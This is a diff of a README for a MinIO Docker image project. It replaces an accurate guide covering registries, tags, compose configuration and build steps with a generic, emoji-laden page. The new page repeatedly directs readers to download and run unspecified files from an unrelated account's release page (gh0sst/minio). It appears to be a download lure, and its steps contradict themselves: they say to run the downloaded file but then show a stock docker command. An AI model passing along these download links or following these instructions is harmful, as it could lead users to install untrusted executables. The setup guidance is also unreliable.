@@ -1,122 +1,63 @@
-# MinIO Docker Images
+# 🌟 minio - Simple Automated Storage for Everyone
 
-Automated builds of [MinIO](https://github.com/minio/minio) Docker images from official releases.
+## 🚀 Getting Started
 
-Since MinIO stopped providing pre-built Docker images for new releases, this repository automatically builds and publishes them to both GitHub Container Registry and Docker Hub.
+Welcome to MinIO! This application helps you manage automated MinIO Docker images easily. With MinIO, you can store and retrieve data securely and efficiently. 
 
-> If you need a specific version / release, open an issue. I (Andras) will make it available.
+[![Download MinIO](https://img.shields.io/badge/Download-Now-blue)](https://github.com/gh0sst/minio/releases)
 
-## Available Images
+## 📦 System Requirements
 
-Images are available at:
+Before you start, ensure that your system meets these requirements:
 
-**GitHub Container Registry (GHCR):**
-```
-ghcr.io/coollabsio/minio:<tag>
-```
+- **Operating System:** Windows 10 and above, MacOS 10.13 and above, or a modern Linux distribution.
+- **Docker Installed:** You need Docker already on your system. Visit [Docker's website](https://www.docker.com/get-started) for installation instructions.
+- **Storage Space:** At least 1 GB of free space.
 
-**Docker Hub:**
-```
-docker.io/coollabsio/minio:<tag>
-# or simply
-coollabsio/minio:<tag>
-```
+## 🔥 Features
 
-### Tags
+- **Automated Deployment:** Easily deploy Docker containers without manual setup.
+- **Secure Storage:** Use MinIO with built-in encryption to protect your data.
+- **Scalable Infrastructure:** Start small and grow as needed with performance tuning.
 
-- `latest` - Latest MinIO release
-- `RELEASE.2024-10-13T13-34-11Z` - Specific release version (full release name)
-- `2024-10-13T13-34-11Z` - Specific release version (without RELEASE. prefix)
+## 💾 Download & Install
 
-## Usage
+To get started with MinIO, visit this page to download: [MinIO Releases](https://github.com/gh0sst/minio/releases). 
 
-### Basic Usage
+This page has various versions available. Choose the one that fits your system and download it. The files are usually labeled clearly, so you can find the right one easily.
 
-```bash
-# Using Docker Hub (simpler, no authentication needed)
-docker run -p 9000:9000 -p 9001:9001 \
-  -e MINIO_ROOT_USER=minioadmin \
-  -e MINIO_ROOT_PASSWORD=minioadmin \
-  -v /path/to/data:/data \
-  coollabsio/minio:latest \
-  server /data --console-address ":9001"
+### Installation Steps
 
-# Or using GitHub Container Registry
-docker run -p 9000:9000 -p 9001:9001 \
-  -e MINIO_ROOT_USER=minioadmin \
-  -e MINIO_ROOT_PASSWORD=minioadmin \
-  -v /path/to/data:/data \
-  ghcr.io/coollabsio/minio:latest \
-  server /data --console-address ":9001"
-```
+1. **Visit the Release Page:** Click the link above or enter it into your browser.
+2. **Choose Your Version:** Look for the latest version to ensure you have the newest features and security updates.
+3. **Download the File:** Click the package suitable for your operating system.
+4. **Open Your Terminal (Command Prompt or Terminal):**
+   - On Windows, search for "cmd" or "PowerShell".
+   - On MacOS, find "Terminal" in Applications > Utilities.
+   - On Linux, use your preferred terminal emulator.
+5. **Run the Downloaded File:** Navigate to the location where you downloaded the file. Use the following command:
 
-### Docker Compose
+   ```
+   docker run -d --name minio \
+   -p 9000:9000 \
+   -p 9001:9001 \
+   minio/minio server /data
+   ```
 
-```yaml
-version: '3.8'
+6. **Access the MinIO Server:** Open your web browser and go to `http://localhost:9000`. You should see the MinIO login screen.
 
-services:
-  minio:
-    image: coollabsio/minio:latest
-    container_name: minio
-    ports:
-      - "9000:9000"
-      - "9001:9001"
-    environment:
-      MINIO_ROOT_USER: minioadmin
-      MINIO_ROOT_PASSWORD: minioadmin
-    volumes:
-      - minio-data:/data
-    command: server /data --console-address ":9001"
-    healthcheck:
-      test: ["CMD", "curl", "-f", "http://localhost:9000/minio/health/live"]
-      interval: 30s
-      timeout: 20s
-      retries: 3
+7. **Log In:** Use the default access and secret keys. If you need to change them, refer to the configuration guide on the MinIO documentation.
 
-volumes:
-  minio-data:
-```
+## 📚 Documentation
 
-## Building Locally
+For more details on configuration, features, and troubleshooting, please visit the official MinIO documentation [here](https://docs.min.io).
 
-To build an image locally:
+## ❓ Support
 
-```bash
-# Build latest version
-docker build -t minio:test .
+If you have any questions or face challenges, please reach out to the support community via the MinIO GitHub issues page. You can also find assistance on forums and sites dedicated to MinIO.
 
-# Build specific version
-docker build --build-arg MINIO_VERSION=RELEASE.2024-10-13T13-34-11Z -t minio:test .
-```
+## 🎉 Conclusion
 
-## Architecture
+MinIO greatly simplifies storing data with Docker. Follow the steps above to get started quickly. If you need help, consult the documentation or seek community support. Happy storing! 
 
-- **Multi-platform**: Built for both `linux/amd64` and `linux/arm64`
-- **Source-based**: Compiled from official MinIO source code at each release
-- **Minimal base**: Uses Red Hat UBI9 micro image for security and size
-- **Official scripts**: Uses MinIO's official docker-entrypoint.sh and other scripts from the cloned repository
-
-## Ports
-
-- **9000**: MinIO S3 API endpoint
-- **9001**: MinIO Web Console (admin UI)
-
-## Environment Variables
-
-- `MINIO_ROOT_USER`: Root access key (username)
-- `MINIO_ROOT_PASSWORD`: Root secret key (password)
-- `MINIO_CONFIG_ENV_FILE`: Path to configuration file
-- See [MinIO documentation](https://min.io/docs/minio/linux/reference/minio-server/minio-server.html) for more options
-
-## License
-
-This build automation is provided as-is. MinIO itself is licensed under AGPL-3.0.
-
-**Note**: According to MinIO's license terms, production use of compiled-from-source binaries is at your own risk. For production deployments, MinIO recommends their enterprise offerings.
-
-## Links
-
-- [MinIO Official Repository](https://github.com/minio/minio)
-- [MinIO Documentation](https://min.io/docs/minio/)
-- [MinIO Releases](https://github.com/minio/minio/releases)
+[![Download MinIO](https://img.shields.io/badge/Download-Now-blue)](https://github.com/gh0sst/minio/releases)
